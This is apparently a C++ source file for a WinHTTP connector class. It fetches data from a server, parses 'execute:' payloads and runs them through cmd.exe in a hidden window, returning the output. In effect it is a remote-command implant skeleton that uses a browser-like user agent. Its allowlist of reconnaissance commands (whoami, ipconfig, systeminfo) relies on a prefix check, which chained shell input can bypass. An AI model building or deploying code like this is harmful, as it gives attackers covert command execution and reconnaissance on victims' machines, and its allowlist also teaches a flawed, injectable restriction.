WinHTTP HttpConnector

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

class HttpConnector {
private:
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET hRequest;

    bool IsAllowedCommand(const std::wstring& command) {
        static const std::vector<std::wstring> allowed = {
            L"whoami",
            L"hostname",
            L"ipconfig",
            L"systeminfo",
            L"dir",
            L"echo",
            L"ping"
        };

        for (const auto& cmd : allowed) {
            if (command == cmd || command.rfind(cmd + L" ", 0) == 0) {
                return true;
            }
        }
        return false;
    }

    std::wstring ExecuteAllowedCommand(const std::wstring& command) {
        if (!IsAllowedCommand(command)) {
            return L"Error: Command not allowed";
        }

        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        HANDLE hRead = NULL;
        HANDLE hWrite = NULL;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
            return L"Error: Failed to create pipe";
        }

        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi = {};
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        std::wstring cmdLine = L"cmd.exe /c \"" + command + L"\"";

        if (!CreateProcessW(
            NULL,
            &cmdLine[0],
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            CloseHandle(hRead);
            CloseHandle(hWrite);
            return L"Error: Failed to create process";
        }

        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(hWrite);

        std::string output;
        char buffer[4096];
        DWORD bytesRead = 0;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            output += buffer;
        }

        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        int wlen = MultiByteToWideChar(CP_OEMCP, 0, output.c_str(), -1, NULL, 0);
        if (wlen > 0) {
            std::wstring wstr(wlen, L'\0');
            MultiByteToWideChar(CP_OEMCP, 0, output.c_str(), -1, &wstr[0], wlen);
            return wstr;
        }

        return L"Command executed (no output)";
    }

public:
    HttpConnector() : hSession(NULL), hConnect(NULL), hRequest(NULL) {}

    bool Initialize(const std::wstring& userAgent = L"Mozilla/5.0") {
        hSession = WinHttpOpen(
            userAgent.c_str(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );
        return hSession != NULL;
    }

    bool Connect(const std::wstring& serverName, int portNumber = 80) {
        if (!hSession) return false;
        hConnect = WinHttpConnect(hSession, serverName.c_str(), portNumber, 0);
        return hConnect != NULL;
    }

    std::wstring SendRequest(const std::wstring& path, const std::wstring& method = L"GET") {
        if (!hConnect) return L"Error: Not connected";

        hRequest = WinHttpOpenRequest(
            hConnect,
            method.c_str(),
            path.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0
        );

        if (!hRequest) return L"Error: Failed to open request";

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            CleanupRequest();
            return L"Error: Failed to send request";
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            CleanupRequest();
            return L"Error: Failed to receive response";
        }

        std::string response;
        DWORD bytesAvailable = 0;
        DWORD bytesRead = 0;
        char buffer[4096];

        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            DWORD toRead = min(bytesAvailable, sizeof(buffer) - 1);
            if (WinHttpReadData(hRequest, buffer, toRead, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
        }

        CleanupRequest();

        int wlen = MultiByteToWideChar(CP_UTF8, 0, response.c_str(), -1, NULL, 0);
        if (wlen > 0) {
            std::wstring wstr(wlen, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, response.c_str(), -1, &wstr[0], wlen);
            return wstr;
        }

        return L"No response received";
    }

    std::wstring ProcessCommand(const std::wstring& payload) {
        const std::wstring prefix = L"execute:";
        if (payload.rfind(prefix, 0) == 0) {
            std::wstring command = payload.substr(prefix.length());
            size_t start = command.find_first_not_of(L" \t\n\r");
            if (start != std::wstring::npos) {
                command = command.substr(start);
            }
            return ExecuteAllowedCommand(command);
        }
        return L"Unknown command format. Use 'execute:command'";
    }

    void CleanupRequest() {
        if (hRequest) {
            WinHttpCloseHandle(hRequest);
            hRequest = NULL;
        }
    }

    void Cleanup() {
        CleanupRequest();
        if (hConnect) {
            WinHttpCloseHandle(hConnect);
            hConnect = NULL;
        }
        if (hSession) {
            WinHttpCloseHandle(hSession);
            hSession = NULL;
        }
    }

    ~HttpConnector() {
        Cleanup();
    }
};
